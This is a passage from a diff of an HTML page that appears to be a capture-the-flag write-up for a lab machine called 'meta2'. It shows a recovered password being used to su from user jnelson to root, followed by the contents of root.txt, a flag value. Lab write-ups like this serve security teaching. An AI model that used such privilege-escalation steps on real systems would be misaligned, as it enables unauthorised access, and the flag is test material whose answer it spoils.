+</span></span><span style="display:flex;"><span>handler: passpie
+</span></span><span style="display:flex;"><span>version: 1.0
+</span></span></code></pre></div><p>Then we simply use that password to <code>su</code> into root and grab the root flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jnelson@meta2:~$ su root
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>root@meta2:/home/jnelson# cd ~
+</span></span><span style="display:flex;"><span>root@meta2:~# ls
+</span></span><span style="display:flex;"><span>restore  root.txt
+</span></span><span style="display:flex;"><span>root@meta2:~# cat root.txt
+</span></span><span style="display:flex;"><span>2d3c4ab94efffc207d41f0f297a12fdf
 </span></span></code></pre></div>
 </content>
 <p>
